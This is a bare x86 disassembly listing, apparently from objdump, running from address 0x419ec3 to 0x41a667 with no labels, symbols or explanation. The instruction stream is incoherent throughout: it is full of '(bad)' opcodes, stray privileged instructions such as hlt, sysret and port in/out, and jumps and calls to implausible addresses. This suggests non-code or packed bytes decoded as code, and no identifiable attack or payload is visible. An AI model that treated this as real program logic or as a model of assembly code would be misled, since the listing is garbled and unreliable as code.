  419ec3:	push   ecx
  419ec4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  419eca:	pushf  
  419ecb:	pushf  
  419ecc:	xor    dh,BYTE PTR [edx]
  419ece:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  419ed4:	or     BYTE PTR [ebp+0x7],al
  419ed7:	mov    eax,ecx
  419ed9:	clc    
  419eda:	jb     0x419e9d
  419edc:	add    BYTE PTR [ebp+0x55],cl
  419edf:	or     DWORD PTR [edi],0xc251d155
  419ee5:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  419eef:	mov    edi,eax
  419ef1:	or     cl,al
  419ef3:	inc    ebp
  419ef4:	dec    ebp
  419ef5:	mov    eax,DWORD PTR [ecx+0x514d550c]
  419efb:	or     WORD PTR [ecx],0x899c
  419f00:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  419f06:	mov    edx,DWORD PTR [ecx+0x8]
  419f09:	mov    eax,DWORD PTR [ebp-0x8]
  419f0c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  419f13:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  419f19:	inc    ebp
  419f1a:	dec    eax
  419f1b:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  419f21:	add    edx,DWORD PTR [ecx-0x8]
  419f24:	mov    ecx,DWORD PTR [ecx]
  419f26:	clc    
  419f27:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  419f2e:	mov    ecx,ebp
  419f30:	clc    
  419f31:	(bad)  
  419f32:	popf   
  419f33:	inc    DWORD PTR [eax]
  419f35:	ret    0x8b
  419f38:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  419f3e:	mov    edi,esp
  419f40:	hlt    
  419f41:	test   ecx,esi
  419f43:	clc    
  419f44:	or     BYTE PTR [ebp+0x7],al
  419f47:	xor    cl,al
  419f49:	pushf  
  419f4a:	jb     0x419f7f
  419f4c:	add    BYTE PTR [eax-0x3f],al
  419f4f:	inc    eax
  419f50:	daa    
  419f51:	inc    ebp
  419f52:	inc    ebp
  419f53:	xor    eax,0x7f80803
  419f58:	dec    ebp
  419f59:	pushf  
  419f5a:	add    esi,DWORD PTR [edx]
  419f5c:	clc    
  419f5d:	cmp    DWORD PTR [ecx],ecx
  419f5f:	or     al,0x8
  419f61:	add    al,BYTE PTR [ebp+0x2c]
  419f64:	xor    eax,0x7350845
  419f69:	or     BYTE PTR [ebp+0x7],cl
  419f6c:	lea    ebx,[ecx+eax*1+0x8b7232]
  419f73:	or     al,0x45
  419f75:	enter  0x4deb,0x8b
  419f79:	mov    edx,DWORD PTR [eax]
  419f7b:	cld    
  419f7c:	dec    ebp
  419f7d:	push   ebp
  419f7e:	sub    edx,DWORD PTR [ecx-0x75]
  419f81:	add    eax,0xf172fc
  419f86:	or     BYTE PTR [ebp+0x7],cl
  419f89:	add    eax,ecx
  419f8b:	or     al,0x72
  419f8d:	add    DWORD PTR [eax],eax
  419f8f:	mov    ebx,0x29c2c1
  419f94:	inc    ebp
  419f95:	mov    eax,DWORD PTR [ebx]
  419f97:	cmp    eax,0x3004d1c
  419f9d:	xbegin 0x66c72b97
  419fa3:	clc    
  419fa4:	or     BYTE PTR [ebp+0x45],al
  419fa7:	xor    BYTE PTR ds:0x78b089c,dh
  419fad:	adc    BYTE PTR [ebp+0x45],cl
  419fb0:	lea    eax,[ebp+0x33727501]
  419fb6:	add    cl,ch
  419fb8:	inc    ebp
  419fb9:	add    bl,ch
  419fbb:	add    BYTE PTR [ebx+0x45850845],cl
  419fc1:	je     0x419f4e
  419fc3:	push   ebx
  419fc4:	or     al,0x85
  419fc6:	dec    ebp
  419fc7:	std    
  419fc8:	mov    bh,bh
  419fca:	mov    BYTE PTR [ebp-0x75],al
  419fcd:	mov    edi,eax
  419fcf:	or     al,0x89
  419fd1:	inc    ebp
  419fd2:	clc    
  419fd3:	mov    esp,esp
  419fd5:	hlt    
  419fd6:	call   DWORD PTR [edi-0x37]
  419fd9:	push   ebp
  419fda:	or     al,0x51
  419fdc:	push   ebp
  419fdd:	xor    ebp,esp
  419fdf:	mov    esi,0x457251
  419fe4:	xor    esi,eax
  419fe6:	pushf  
  419fe7:	inc    ebp
  419fe8:	(bad)  
  419fe9:	mov    edi,eax
  419feb:	or     al,0x85
  419fed:	add    al,bh
  419fef:	inc    eax
  419ff1:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  419ff5:	or     ah,bh
  419ff7:	inc    eax
  419ff8:	push   ebp
  419ff9:	jmp    0x41a04c
  419ffb:	mov    eax,DWORD PTR ds:0xe8720c
  41a001:	mov    DWORD PTR [ebp-0x8],eax
  41a004:	jne    0x41a04b
  41a006:	jmp    0x419f93
  41a008:	mov    ebp,DWORD PTR [eax]
  41a00a:	clc    
  41a00b:	retf   0xff55
  41a00e:	push   ecx
  41a00f:	mov    DWORD PTR ds:0x757210,eax
  41a015:	mov    ecx,DWORD PTR [ebp-0x4]
  41a018:	sub    esp,DWORD PTR [ebx-0x77]
  41a01b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41a022:	or     ah,bh
  41a024:	pop    es
  41a025:	ds pushf 
  41a027:	push   DWORD PTR [edx]
  41a029:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41a02f:	(bad)  
  41a030:	mov    bh,bh
  41a032:	jmp    0x41a020
  41a034:	leave  
  41a035:	jne    0x41a03f
  41a037:	call   0x2e9991
  41a03c:	in     al,dx
  41a03d:	dec    ebp
  41a03e:	add    dh,BYTE PTR [ebx]
  41a040:	add    BYTE PTR [ebx],al
  41a042:	inc    ebp
  41a043:	cmp    esi,DWORD PTR [ecx]
  41a045:	je     0x419fe3
  41a047:	mov    eax,edi
  41a049:	or     al,0xf0
  41a04b:	add    BYTE PTR [ebp+0x458bf845],al
  41a051:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  41a057:	adc    al,0x7
  41a059:	enter  0x9fc0,0xa5
  41a05d:	rol    BYTE PTR [eax],0x5e
  41a060:	mov    ecx,ecx
  41a062:	or     al,0xc
  41a064:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  41a06b:	jmp    0x41a06c
  41a06d:	push   ebp
  41a06e:	mov    esp,ebp
  41a070:	cld    
  41a071:	inc    ebp
  41a072:	inc    ebp
  41a073:	or     DWORD PTR [ecx+0x457dec10],0x0
  41a07a:	push   esi
  41a07b:	push   esi
  41a07c:	mov    edi,0x7af080f
  41a081:	add    bh,al
  41a083:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  41a08a:	mov    DWORD PTR [edi],ecx
  41a08c:	adc    BYTE PTR [eax+0x45],al
  41a08f:	mov    ebp,eax
  41a091:	mov    ebp,edi
  41a093:	lock call edx
  41a096:	fcom   DWORD PTR [ebp+0x45]
  41a099:	mov    eax,0x148a8b
  41a09e:	push   ecx
  41a09f:	enter  0xc145,0x83
  41a0a3:	cmp    ecx,DWORD PTR [eax]
  41a0a5:	add    BYTE PTR [ebp+0x4d],al
  41a0a8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  41a0ae:	call   0xffa19c1d
  41a0b3:	cmp    eax,DWORD PTR [ebp-0xc]
  41a0b6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  41a0ba:	push   ebp
  41a0bb:	(bad)  
  41a0bc:	call   0x329ec0
  41a0c1:	mov    bh,0xdb
  41a0c3:	cld    
  41a0c4:	or     BYTE PTR [ebp+0x45],bl
  41a0c7:	(bad)  
  41a0c8:	call   0xff7b9d58
  41a0cd:	add    al,BYTE PTR [ebp+0x37]
  41a0d0:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  41a0d6:	jne    0x41a0d8
  41a0d8:	(bad)  
  41a0d9:	cmp    edi,esp
  41a0db:	jne    0x41a10e
  41a0dd:	mov    edi,edi
  41a0df:	or     BYTE PTR [ebx-0x307f0b49],cl
  41a0e5:	pop    ds
  41a0e6:	into   
  41a0e7:	je     0x41a0aa
  41a0e9:	mov    ebx,DWORD PTR [esi]
  41a0eb:	or     BYTE PTR [ebp-0x49],al
  41a0ee:	mov    esp,DWORD PTR [esi-0x77]
  41a0f1:	mov    esi,0x4451f0c
  41a0f6:	mov    eax,DWORD PTR [eax]
  41a0f8:	or     al,0x66
  41a0fa:	sar    bl,0x3b
  41a0fd:	xor    esi,DWORD PTR [ebp+0x66]
  41a100:	xor    ecx,edi
  41a102:	pop    edi
  41a103:	adc    bl,BYTE PTR [ebx+0x70]
  41a106:	ret    0xff
  41a109:	cld    
  41a10a:	inc    ebp
  41a10b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  41a111:	cld    
  41a112:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  41a119:	push   0xffffff83
  41a11b:	pop    edi
  41a11c:	or     BYTE PTR [ebp+0x53],dh
  41a11f:	xorps  xmm1,xmm2
  41a122:	test   BYTE PTR [eax+eax*1],bh
  41a125:	add    BYTE PTR [eax],al
  41a127:	adc    eax,eax
  41a129:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  41a131:	jmp    DWORD PTR [eax]
  41a133:	ror    al,0x5e
  41a136:	inc    ebp
  41a137:	leave  
  41a138:	xor    ecx,DWORD PTR [eax]
  41a13a:	and    DWORD PTR [ebx-0x3ec10708],ecx
  41a140:	add    ah,al
  41a142:	xor    edi,edi
  41a144:	xor    DWORD PTR [ebx],0x66003304
  41a14a:	mov    DWORD PTR [ebp-0xc],ecx
  41a14d:	pcmpgtw mm0,mm0
  41a150:	add    dl,ah
  41a152:	leave  
  41a153:	mov    edi,DWORD PTR [esi-0x7d]
  41a156:	push   ax
  41a158:	dec    ebp
  41a159:	mov    esi,DWORD PTR [ebx-0x75]
  41a15c:	lea    ebp,[eax-0x7c00ff04]
  41a162:	xor    eax,DWORD PTR [eax]
  41a164:	sysret 
  41a166:	dec    ebp
  41a167:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  41a16e:	push   WORD PTR [ecx+0x8]
  41a172:	jne    0x41a135
  41a174:	ud0    ecx,DWORD PTR [ecx]
  41a177:	mov    eax,edx
  41a179:	lods   al,BYTE PTR ds:[esi]
  41a17a:	add    BYTE PTR [eax],al
  41a17c:	data16 (bad) 
  41a17e:	iret   
  41a17f:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  41a186:	cli    
  41a187:	inc    ebp
  41a188:	cmp    al,0x8d
  41a18a:	add    BYTE PTR [esi+0x2d],ah
  41a18d:	inc    ebp
  41a18e:	pop    ebp
  41a18f:	lea    ecx,[edi]
  41a191:	mov    dl,bh
  41a193:	add    BYTE PTR [edi],cl
  41a195:	mov    DWORD PTR [eax+eax*8],edi
  41a198:	mov    ebx,0x3b87
  41a19d:	add    BYTE PTR [ebx],ch
  41a19f:	inc    ebp
  41a1a0:	data16 (bad) 
  41a1a2:	clc    
  41a1a3:	int3   
  41a1a4:	cmp    eax,DWORD PTR [eax]
  41a1a6:	je     0x41a131
  41a1a8:	push   0xffffffc8
  41a1aa:	pop    edi
  41a1ab:	xchg   DWORD PTR [ebp+0x0],eax
  41a1ae:	data16 add BYTE PTR [ebp+0x45],cl
  41a1b2:	lea    cx,[ebp+0x10]
  41a1b6:	jb     0x41a1b8
  41a1b8:	jmp    0x41a143
  41a1ba:	call   eax
  41a1bc:	clc    
  41a1bd:	xchg   DWORD PTR [edi+0x1],edi
  41a1c0:	mov    eax,DWORD PTR [eax]
  41a1c2:	or     BYTE PTR [ebp-0x49],al
  41a1c5:	lea    eax,[eax+0x74003154]
  41a1cb:	push   edi
  41a1cc:	inc    edx
  41a1cd:	jge    0x41a1ce
  41a1cf:	mov    DWORD PTR [edi],ecx
  41a1d1:	fdiv   DWORD PTR [edi-0x6]
  41a1d4:	inc    DWORD PTR [eax]
  41a1d6:	xor    edx,DWORD PTR [eax+0x5f]
  41a1d9:	xchg   DWORD PTR [ebx+0x1],ebx
  41a1dc:	ret    0x0
  41a1df:	xor    BYTE PTR [ebp-0x51],cl
  41a1e2:	cmp    edi,0xf0ff89fc
  41a1e8:	data16 ror al,0x84
  41a1ec:	rol    BYTE PTR [eax],0x3b
  41a1ef:	add    al,dh
  41a1f1:	dec    eax
  41a1f2:	xchg   esp,eax
  41a1f3:	push   ebx
  41a1f4:	jmp    0x41a181
  41a1f6:	push   ebp
  41a1f7:	add    esp,ebp
  41a1f9:	add    ebp,esp
  41a1fb:	mov    edx,DWORD PTR [edi+0x24]
  41a1fe:	clc    
  41a1ff:	dec    esi
  41a200:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  41a206:	cmp    BYTE PTR [ebx],al
  41a208:	jne    0x41a193
  41a20a:	xor    esp,eax
  41a20c:	jmp    0x44a38f
  41a211:	add    ebp,DWORD PTR [ecx+ecx*4]
  41a214:	jne    0x41a20a
  41a216:	call   0xffcb9f70
  41a21b:	clc    
  41a21c:	xchg   edi,eax
  41a21d:	sti    
  41a21e:	add    DWORD PTR [ebx],eax
  41a220:	add    BYTE PTR [ebp+0x47],bl
  41a223:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  41a229:	pop    ebp
  41a22a:	mov    DWORD PTR [esi-0x48],esi
  41a22d:	jmp    0x41a276
  41a22f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  41a235:	(bad)  
  41a237:	cmp    al,0x0
  41a239:	cmp    eax,DWORD PTR [ebp+0x18]
  41a23c:	lea    ebx,[ebp-0x56]
  41a23f:	jle    0x41a241
  41a241:	jae    0x41a1cc
  41a243:	mov    eax,esp
  41a245:	call   0xb900:0x8b005587
  41a24c:	inc    ebp
  41a24d:	push   ebp
  41a24e:	lea    ecx,[ebp-0x27ff4f12]
  41a254:	mov    eax,edi
  41a256:	int3   
  41a257:	push   ebp
  41a258:	xchg   edi,eax
  41a25a:	add    esp,ebp
  41a25c:	add    BYTE PTR [eax],al
  41a25e:	inc    ebp
  41a25f:	add    BYTE PTR [ebp+0x8b3255],cl
  41a265:	cld    
  41a266:	mov    DWORD PTR [edx],edi
  41a268:	aam    0x75
  41a26a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  41a270:	mov    DWORD PTR [ebx-0x50],edx
  41a273:	test   BYTE PTR [ebp-0x1],0xe8
  41a277:	mov    eax,DWORD PTR [eax]
  41a279:	hlt    
  41a27a:	add    al,al
  41a27c:	mov    eax,DWORD PTR ds:0x890045a8
  41a282:	dec    DWORD PTR [ebx+0x45fdf0e8]
  41a288:	inc    DWORD PTR [eax*2+0xf75854d]
  41a28f:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  41a295:	call   0x7297ffd6
  41a29a:	je     0x41a2fa
  41a29c:	js     0x41a2fd
  41a29e:	lock ret 0x7e
  41a2a2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  41a2a8:	mov    edi,edi
  41a2aa:	sbb    al,bl
  41a2ac:	clc    
  41a2ad:	add    BYTE PTR [ebp-0x73],bh
  41a2b0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  41a2b6:	ror    BYTE PTR [eax],1
  41a2b8:	dec    ebp
  41a2b9:	xchg   ebp,eax
  41a2ba:	mov    edi,edi
  41a2bc:	in     al,0x8b
  41a2be:	jge    0x41a249
  41a2c0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  41a2c6:	clc    
  41a2c7:	pop    esi
  41a2c8:	fist   DWORD PTR [ebp+0x5d398b5d]
  41a2ce:	clc    
  41a2cf:	add    al,0x6e
  41a2d1:	mov    eax,DWORD PTR [ebx]
  41a2d3:	mov    BYTE PTR [ebp+0x0],dl
  41a2d6:	mov    edx,DWORD PTR [ebx-0x20]
  41a2d9:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  41a2df:	add    eax,0x3b3b73
  41a2e4:	adc    al,0x89
  41a2e6:	pop    eax
  41a2e7:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  41a2eb:	ret    0xf08
  41a2ee:	cmp    al,0x2
  41a2f0:	mov    edx,eax
  41a2f2:	cld    
  41a2f3:	add    BYTE PTR [ebp+0x66],dl
  41a2f6:	add    eax,ebx
  41a2f8:	add    esp,eax
  41a2fa:	sub    eax,eax
  41a2fc:	or     BYTE PTR [ecx-0x77f474bb],cl
  41a302:	add    BYTE PTR [eax],al
  41a304:	mov    DWORD PTR [ebx-0x24],ebx
  41a307:	push   edi
  41a308:	push   ebp
  41a309:	clc    
  41a30a:	add    DWORD PTR [esi+0x1b0100],0x45
  41a311:	out    0xff,eax
  41a313:	add    edx,DWORD PTR [eax]
  41a315:	jmp    0x41a2ff
  41a317:	cmp    ch,0x47
  41a31a:	(bad)  
  41a31b:	jmp    0x40c72b6d
  41a320:	je     0x41a2ac
  41a322:	mov    eax,DWORD PTR [eax-0x10c78f04]
  41a328:	inc    ebp
  41a329:	add    BYTE PTR [ebx-0x770375],al
  41a32f:	add    ah,ch
  41a331:	add    edx,esp
  41a333:	pop    edi
  41a334:	pop    ebp
  41a335:	push   ebp
  41a336:	inc    ebx
  41a337:	in     al,dx
  41a338:	pop    ebp
  41a339:	in     al,dx
  41a33a:	cmp    edx,DWORD PTR [edi-0x8]
  41a33d:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  41a344:	add    al,0x47
  41a346:	push   ebp
  41a347:	mov    esp,ebp
  41a349:	in     al,0x45
  41a34b:	dec    ebp
  41a34c:	push   esi
  41a34d:	test   DWORD PTR [eax+0xfb010f],esi
  41a353:	add    BYTE PTR [eax+0xc018b],dh
  41a359:	leave  
  41a35a:	inc    ebp
  41a35b:	test   al,ch
  41a35d:	add    dh,bh
  41a35f:	add    bh,bh
  41a361:	dec    ebp
  41a362:	push   cs
  41a363:	mov    DWORD PTR [ecx],eax
  41a365:	hlt    
  41a366:	push   es
  41a367:	dec    ebp
  41a368:	leave  
  41a369:	mov    DWORD PTR [eax],ecx
  41a36b:	clc    
  41a36c:	cmovge eax,ecx
  41a36f:	mov    ecx,0x85c2f0
  41a375:	clc    
  41a376:	pop    DWORD PTR [ebp+0x1]
  41a379:	push   ebx
  41a37a:	add    BYTE PTR [ebp-0x15],bh
  41a37d:	push   esi
  41a37e:	xor    eax,0x898a45
  41a383:	cld    
  41a384:	add    al,0x45
  41a386:	add    BYTE PTR [ebx],dh
  41a388:	pushfw 
  41a38a:	add    DWORD PTR [esi+0x78308c1],edi
  41a390:	add    ah,BYTE PTR [edi+esi*4-0x33]
  41a394:	mov    ebx,0xc4e8b
  41a399:	(bad)  
  41a39a:	cmp    ecx,ebx
  41a39c:	jne    0x41a366
  41a39e:	xor    ecx,DWORD PTR [ebp+0x66]
  41a3a1:	jmp    0xc8a3a7
  41a3a6:	add    DWORD PTR [ebp+0x0],eax
  41a3a9:	mov    eax,ebx
  41a3ab:	or     al,0x8b
  41a3ad:	(bad)  
  41a3ae:	mov    ecx,esi
  41a3b0:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  41a3b7:	mov    eax,edi
  41a3b9:	or     BYTE PTR [edx],cl
  41a3bb:	shl    cl,cl
  41a3bd:	icebp  
  41a3be:	add    BYTE PTR [ebp+0x37],0x8b
  41a3c2:	or     BYTE PTR [edx+eax*2],cl
  41a3c5:	(bad)  
  41a3c6:	or     cl,dh
  41a3c8:	stc    
  41a3c9:	shl    DWORD PTR [ebp-0x30],0xc6
  41a3cd:	xor    al,0x0
  41a3cf:	inc    ebp
  41a3d0:	xchg   BYTE PTR [ebx],al
  41a3d2:	add    esp,edi
  41a3d4:	add    BYTE PTR [ebp-0x39],cl
  41a3d7:	mov    al,bl
  41a3d9:	test   DWORD PTR [ebx+0x1c348375],ecx
  41a3df:	sub    al,0xbf
  41a3e1:	jmp    0x41a368
  41a3e3:	mov    edi,eax
  41a3e5:	lock jge 0x41a3d9
  41a3e8:	lea    esi,[edx-0x74bad501]
  41a3ee:	mov    ebp,esp
  41a3f0:	or     cl,dh
  41a3f2:	leave  
  41a3f3:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  41a3fa:	dec    ebp
  41a3fb:	dec    ebp
  41a3fc:	test   DWORD PTR [ebx],eax
  41a3fe:	paddb  mm6,mm0
  41a401:	add    DWORD PTR [eax],eax
  41a403:	dec    ebp
  41a404:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  41a40a:	mov    esi,DWORD PTR [edx]
  41a40c:	or     al,0x2b
  41a40e:	dec    ebp
  41a40f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  41a415:	mov    esp,esi
  41a417:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  41a41e:	mov    DWORD PTR [ebx],ebp
  41a420:	call   0xc752d50
  41a425:	mov    DWORD PTR [ebp+0x10],ecx
  41a428:	(bad)  
  41a429:	push   0x8b85ff10
  41a42e:	clc    
  41a42f:	or     al,0x55
  41a431:	(bad)  
  41a432:	push   ecx
  41a433:	retf   
  41a434:	mov    ebx,0xff4d8dc8
  41a439:	mov    DWORD PTR [ebp+0x8],eax
  41a43c:	xor    eax,DWORD PTR [ebp-0x75]
  41a43f:	cmp    ebp,DWORD PTR [ebx]
  41a441:	lsl    ebx,WORD PTR [edi-0x8]
  41a445:	call   DWORD PTR [ebx-0x741bff75]
  41a44b:	(bad)  
  41a44c:	or     al,0x5b
  41a44e:	dec    ebp
  41a44f:	or     BYTE PTR [ebx],dh
  41a451:	inc    ebp
  41a452:	xor    esi,DWORD PTR ds:0x708088d
  41a458:	in     eax,0x9c
  41a45a:	add    BYTE PTR [edx],dh
  41a45c:	inc    ebp
  41a45d:	pop    edi
  41a45e:	xor    eax,edx
  41a460:	test   DWORD PTR [eax],0x83108b8b
  41a466:	dec    ebp
  41a467:	adc    al,0x33
  41a469:	inc    ebp
  41a46a:	xor    esi,DWORD PTR [ecx]
  41a46c:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  41a473:	test   DWORD PTR [eax],ecx
  41a475:	clc    
  41a476:	inc    ebp
  41a477:	add    ecx,DWORD PTR [ebx+0xc7f445]
  41a47d:	hlt    
  41a47e:	leave  
  41a47f:	test   DWORD PTR [esi],eax
  41a481:	clc    
  41a482:	inc    edi
  41a483:	push   edi
  41a484:	aaa    
  41a485:	inc    ebp
  41a486:	pop    ss
  41a487:	ror    DWORD PTR [ebp-0x29],1
  41a48a:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  41a491:	mov    eax,0x780084d
  41a496:	push   ebp
  41a497:	clc    
  41a498:	ret    0xe99c
  41a49b:	xor    dl,dl
  41a49d:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  41a4a3:	js     0x88830a2
  41a4a9:	dec    ebp
  41a4aa:	push   ebp
  41a4ab:	mov    edi,DWORD PTR [eax+0xc872fc]
  41a4b1:	lock enter 0xceca,0xf2
  41a4b6:	retf   0x18ce
  41a4b9:	jne    0x41a508
  41a4bb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  41a4c1:	enter  0xf0d6,0xca
  41a4c5:	retf   0xf2c8
  41a4c8:	into   
  41a4c9:	out    dx,al
  41a4ca:	dec    ebp
  41a4cb:	dec    ebp
  41a4cc:	jmp    0xff45a404
  41a4d1:	xor    eax,DWORD PTR [ebp-0x15]
  41a4d4:	xor    esi,DWORD PTR [ebx]
  41a4d6:	mov    esi,DWORD PTR [ebx]
  41a4d8:	sub    eax,DWORD PTR [ebx]
  41a4da:	add    eax,DWORD PTR [ebx]
  41a4dc:	or     bl,dl
  41a4de:	dec    ebp
  41a4df:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  41a4e5:	xor    eax,DWORD PTR [ebp-0xf00073]
  41a4eb:	jb     0x41a532
  41a4ed:	add    BYTE PTR [ebx],dh
  41a4ef:	dec    ebp
  41a4f0:	pop    esi
  41a4f1:	mov    ebp,ebx
  41a4f3:	cld    
  41a4f4:	mov    esi,eax
  41a4f6:	call   0x520ffac3
  41a4fb:	stc    
  41a4fc:	add    eax,0x4572aa
  41a501:	pop    edi
  41a502:	leave  
  41a503:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  41a50a:	in     al,dx
  41a50b:	mov    eax,edi
  41a50d:	xor    eax,0xf8008520
  41a513:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  41a51a:	mov    eax,DWORD PTR [ebp-0x77]
  41a51d:	xor    al,bh
  41a51f:	pushf  
  41a520:	inc    ebp
  41a521:	(bad)  
  41a522:	cmp    eax,ebp
  41a524:	pushf  
  41a525:	xchg   BYTE PTR [esi-0x8],dl
  41a528:	mov    edi,0x8518e4ec
  41a52e:	jmp    0xf056:0x8b457df8
  41a535:	push   ebp
  41a536:	push   ebp
  41a537:	push   ecx
  41a538:	push   ecx
  41a539:	push   edi
  41a53a:	xor    eax,esi
  41a53c:	mov    edx,0x32729c
  41a541:	add    ecx,eax
  41a543:	mov    edx,edi
  41a545:	clc    
  41a546:	retf   0xaf45
  41a549:	cmp    ebx,ebp
  41a54b:	pushf  
  41a54c:	mov    eax,edi
  41a54e:	clc    
  41a54f:	cld    
  41a550:	jne    0x41a56a
  41a552:	xor    ebp,edx
  41a554:	xor    eax,DWORD PTR [ebp+0x3]
  41a557:	or     BYTE PTR [ebx],al
  41a559:	add    BYTE PTR [ebp-0x7747475],al
  41a55f:	hlt    
  41a560:	dec    ebp
  41a561:	dec    ebp
  41a562:	je     0x41a597
  41a564:	xor    esi,DWORD PTR [ebx]
  41a566:	xor    eax,DWORD PTR [ebx]
  41a568:	add    eax,DWORD PTR [ebx]
  41a56a:	add    ecx,DWORD PTR [edi]
  41a56c:	rol    ecx,cl
  41a56e:	mov    esi,DWORD PTR [ecx]
  41a570:	in     al,dx
  41a571:	inc    ebp
  41a572:	enter  0xca2b,0x33
  41a576:	icebp  
  41a577:	mov    DWORD PTR [edx],ecx
  41a579:	clc    
  41a57a:	lock pop ebp
  41a57c:	enter  0xf2e8,0xfe
  41a580:	retf   0xeeff
  41a583:	inc    ebp
  41a584:	jne    0x41a511
  41a586:	mov    edi,eax
  41a588:	cld    
  41a589:	dec    ebp
  41a58a:	enter  0xbc89,0x8d
  41a58e:	pushf  
  41a58f:	sti    
  41a590:	xor    bh,bh
  41a592:	mov    eax,DWORD PTR [ebp-0xc]
  41a595:	mov    esi,DWORD PTR [ebp-0x4]
  41a598:	xor    eax,esi
  41a59a:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  41a5a1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  41a5a7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  41a5ad:	(bad)  
  41a5ae:	push   ebp
  41a5af:	shr    esp,0x4d
  41a5b2:	in     al,dx
  41a5b3:	cmp    eax,DWORD PTR [esi+esi*2]
  41a5b6:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  41a5bc:	pushf  
  41a5bd:	mov    edi,0x85c7f445
  41a5c3:	call   0xf8872cc0
  41a5c8:	xor    ebx,ebx
  41a5ca:	pushf  
  41a5cb:	popa   
  41a5cc:	push   ebx
  41a5cd:	dec    ebp
  41a5ce:	inc    ebp
  41a5cf:	mov    esi,DWORD PTR [esi]
  41a5d1:	clc    
  41a5d2:	pushf  
  41a5d3:	into   
  41a5d4:	mov    ecx,edi
  41a5d6:	in     al,dx
  41a5d7:	call   0x8b49eb9a
  41a5dc:	pop    es
  41a5dd:	or     BYTE PTR [ebx],dh
  41a5df:	or     BYTE PTR [edi+0x8a724d],bh
  41a5e5:	or     eax,edi
  41a5e7:	push   ebp
  41a5e8:	inc    ebp
  41a5e9:	cmpxchg8b (bad)
  41a5ea:	(bad)  
  41a5eb:	leave  
  41a5ec:	loopne 0x41a5b8
  41a5ee:	test   DWORD PTR [ebp-0x8],ecx
  41a5f1:	mov    eax,DWORD PTR [ebp-0x18]
  41a5f4:	rcl    DWORD PTR [ebp-0x29],1
  41a5f7:	xor    eax,edi
  41a5f9:	add    esi,eax
  41a5fb:	and    eax,DWORD PTR [eax]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	(bad)  
  41a600:	leave  
  41a601:	sti    
  41a602:	inc    ebp
  41a603:	dec    DWORD PTR [ebx-0x39cc13ab]
  41a609:	mov    esi,ecx
  41a60b:	clc    
  41a60c:	(bad)  
  41a60d:	dec    ebp
  41a60e:	iret   
  41a60f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  41a615:	jb     0x41a613
  41a617:	add    bh,al
  41a619:	inc    ebp
  41a61a:	(bad)  
  41a61b:	mov    eax,DWORD PTR [ebp-0xc]
  41a61e:	(bad)  
  41a61f:	xabort 0x64
  41a622:	loopne 0x41a5f1
  41a624:	jmp    FWORD PTR [ebx]
  41a626:	mov    DWORD PTR [ebx],eax
  41a628:	clc    
  41a629:	lock inc ebp
  41a62b:	dec    ebp
  41a62c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  41a632:	loopne 0x41a667
  41a634:	inc    DWORD PTR [ebx]
  41a636:	mov    edi,DWORD PTR [ebx]
  41a638:	hlt    
  41a639:	jne    0x41a688
  41a63b:	mov    esi,DWORD PTR [ebx]
  41a63d:	in     al,0x8d
  41a63f:	dec    ebp
  41a640:	or     BYTE PTR [ebx],dh
  41a642:	jb     0x41a647
  41a644:	add    BYTE PTR [edi+0x45],bl
  41a647:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  41a64d:	add    BYTE PTR [ebx],dh
  41a64f:	mov    esi,DWORD PTR [ebx]
  41a651:	sub    DWORD PTR [ebx],0x6c
  41a654:	mov    eax,DWORD PTR [ebp-0x4]
  41a657:	xor    eax,ecx
  41a659:	pushf  
  41a65a:	mov    ecx,0x338545ba
  41a65f:	clc    
  41a660:	add    edx,DWORD PTR [ebp-0x77]
  41a663:	mov    edi,eax
  41a665:	adc    al,0x45
  41a667:	inc    ebp
